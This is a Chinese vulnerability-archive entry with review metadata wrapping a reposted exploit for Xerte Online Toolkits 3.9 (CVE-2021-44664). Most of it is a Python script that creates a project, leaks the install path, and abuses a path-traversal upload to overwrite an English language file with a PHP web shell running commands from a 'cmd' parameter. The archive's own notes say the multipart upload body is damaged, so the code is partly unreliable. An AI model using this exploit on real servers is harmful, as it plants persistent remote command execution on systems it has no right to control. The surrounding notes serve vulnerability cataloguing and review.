---
title: "Xerte Online Toolkits 上传mediapath遍历覆盖语言文件远程代码执行"
product: "Xerte Online Toolkits"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2021-44664"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "3.9或up until3.9边界含混；链接为3.8.5-33；en-GB语言"
prerequisites: "需项目创建权限；可启用guest或有效PHP会话"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
identifier_role: "primary"
source: "原收录资料；原始作者及出处待核实"
source_url: "https://mp.weixin.qq.com/s/_XqhyucSnoZH6Kfn3R-LFA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Xerte/0day%20EXP%20Xerte3.9%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%88RCE%EF%BC%89.md"
id: "vw-15282b3ed88cadf06688b69d"
entity_id: "ve-15282b3ed88cadf06688b69d"
schema_version: "1"
---

# Xerte Online Toolkits 上传mediapath遍历覆盖语言文件远程代码执行

## 条目说明

- 对象与具体问题：Xerte Online Toolkits；上传mediapath遍历覆盖语言文件RCE
- 版本、配置及部署条件：3.9或up until3.9边界含混；链接为3.8.5-33；en-GB语言
- 认证与权限前提：需项目创建权限；可启用guest或有效PHP会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 0day标题与已分配CVE/公开转载冲突，应历史日期化
- multipart Content-Disposition两处丢name及filename属性，关键上传体损坏；反斜杠续行后空白亦需核
- 脚本创建项目并覆盖languages/en-GB/index.inc为持久命令文件，破坏/恢复步骤缺失
- 成功仅response包含success并输出URL未验证执行；索引[0]缺异常处理
- 删除大量Valentines装饰和招群；保留作者/语言/guest前提

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_XqhyucSnoZH6Kfn3R-LFA)

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本公众号不承担责任，均由本人自行承担。本公众号中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

  

漏洞说明
----

Xerte项目旨在为世界各地的教育工作者提供高质量的免费软件，并建立一个全球用户和开发人员社区。

**漏洞类型：**命令执行漏洞

**漏洞危害：**高危

**影响版本：**Version 3.9

漏洞EXP
-----

```
# Exploit Title: Xerte 3.9 - Remote Code Execution (RCE) (Authenticated)  
# Date: 05/03/2021  
# Exploit Author: Rik Lutz  
# Vendor Homepage: https://xerte.org.uk  
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.8.5-33.zip  
# Version: up until version 3.9  
# Tested on: Windows 10 XAMP   
# CVE : CVE-2021-44664  
  
# This PoC assumes guest login is enabled and the en-GB langues files are used.   
# This PoC wil overwrite the existing langues file (.inc) for the englisch index page with a shell.  
# Vulnerable url: https://<host>/website_code/php/import/fileupload.php  
# The mediapath variable can be used to set the destination of the uploaded.  
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota  
  
import requests  
import re  
  
xerte_base_url = "http://127.0.0.1"  
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.  
  
with requests.Session() as session:  
    # Get a PHP session ID  
    if not php_session_id:  
        session.get(xerte_base_url)   
    else:  
        session.cookies.set("PHPSESSID", php_session_id)  
  
     # Use a default template  
    data = {  
        'tutorialid': 'Nottingham',  
        'templatename': 'Nottingham',  
        'tutorialname': 'exploit',  
        'folder_id': ''  
    }  
  
    # Create a new project in order to find the install path  
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)  
  
    # Find template ID  
    data = {  
        'template_id': re.findall('(\d+)', template_id.text)[0]  
    }  
  
    # Find the install path:  
    install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)  
    install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]  
  
    headers = {  
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',  
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',  
        'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',  
        'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',  
       }  
  
    # index.inc file  
    data = \  
    '''-----------------------------170331411929658976061651588978  
Content-Disposition: form-data;   
Content-Type: application/octet-stream  
  
<?php  
if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }  
/**  
 *  
 * index.php english language file  
 *  
 * @author Patrick Lockley  
 * @version 1.0  
 * @copyright Pat Lockley  
 * @package  
 */  
  
define("INDEX_USERNAME_AND_PASSWORD_EMPTY", "Please enter your username and password");  
  
define("INDEX_USERNAME_EMPTY", "Please enter your username");  
  
define("INDEX_PASSWORD_EMPTY", "Please enter your password");  
  
define("INDEX_LDAP_MISSING", "PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");  
  
define("INDEX_SITE_ADMIN", "Site admins should log on on the manangement page");  
  
define("INDEX_LOGON_FAIL", "Sorry that password combination was not correct");  
  
define("INDEX_LOGIN", "login area");  
  
define("INDEX_USERNAME", "Username");  
  
define("INDEX_PASSWORD", "Password");  
  
define("INDEX_HELP_TITLE", "Getting Started");  
  
define("INDEX_HELP_INTRODUCTION", "We\'ve produced a short introduction to the Toolkits website.");  
  
define("INDEX_HELP_INTRO_LINK_TEXT","Show me!");  
  
define("INDEX_NO_LDAP","PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");  
  
define("INDEX_FOLDER_PROMPT","What would you like to call your folder?");  
  
define("INDEX_WORKSPACE_TITLE","My Projects");  
  
define("INDEX_CREATE","Project Templates");  
  
define("INDEX_DETAILS","Project Details");  
  
define("INDEX_SORT","Sort");  
  
define("INDEX_SEARCH","Search");  
  
define("INDEX_SORT_A","Alphabetical A-Z");  
  
define("INDEX_SORT_Z","Alphabetical Z-A");  
  
define("INDEX_SORT_NEW","Age (New to Old)");  
  
define("INDEX_SORT_OLD","Age (Old to New)");  
  
define("INDEX_LOG_OUT","Log out");  
  
define("INDEX_LOGGED_IN_AS","Logged in as");  
  
define("INDEX_BUTTON_LOGIN","Login");  
  
define("INDEX_BUTTON_LOGOUT","Logout");  
  
define("INDEX_BUTTON_PROPERTIES","Properties");  
  
define("INDEX_BUTTON_EDIT","Edit");  
  
define("INDEX_BUTTON_PREVIEW", "Preview");  
  
define("INDEX_BUTTON_SORT", "Sort");  
  
define("INDEX_BUTTON_NEWFOLDER", "New Folder");  
  
define("INDEX_BUTTON_NEWFOLDER_CREATE", "Create");  
  
define("INDEX_BUTTON_DELETE", "Delete");  
  
define("INDEX_BUTTON_DUPLICATE", "Duplicate");  
  
define("INDEX_BUTTON_PUBLISH", "Publish");  
  
define("INDEX_BUTTON_CANCEL", "Cancel");  
  
define("INDEX_BUTTON_SAVE", "Save");  
  
define("INDEX_XAPI_DASHBOARD_FROM", "From:");  
  
define("INDEX_XAPI_DASHBOARD_UNTIL", "Until:");  
  
define("INDEX_XAPI_DASHBOARD_GROUP_SELECT", "Select group:");  
  
define("INDEX_XAPI_DASHBOARD_GROUP_ALL", "All groups");  
  
define("INDEX_XAPI_DASHBOARD_SHOW_NAMES", "Show names and/or email addresses");  
  
define("INDEX_XAPI_DASHBOARD_CLOSE", "Close dashboard");  
  
define("INDEX_XAPI_DASHBOARD_DISPLAY_OPTIONS", "Display options");  
  
define("INDEX_XAPI_DASHBOARD_SHOW_HIDE_COLUMNS", "Show / hide columns");  
  
define("INDEX_XAPI_DASHBOARD_QUESTION_OVERVIEW", "Interaction overview");  
  
define("INDEX_XAPI_DASHBOARD_PRINT", "Print");  
\r  
\r  
-----------------------------170331411929658976061651588978  
Content-Disposition: form-data;   
  
''' \  
    + install_path \  
    + '''../../../languages/en-GB/  
-----------------------------170331411929658976061651588978--\r  
'''  
  
    # Overwrite index.inc file  
    response = session.post(xerte_base_url + '/website_code/php/import/fileupload.php', headers=headers, data=data)  
    print('Installation path: ' + install_path)  
    print(response.text)  
    if "success" in response.text:  
        print("Visit shell @: " + xerte_base_url + '/?cmd=whoami') 
```





  



后台回复“粉丝群”加入公众号粉丝群

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
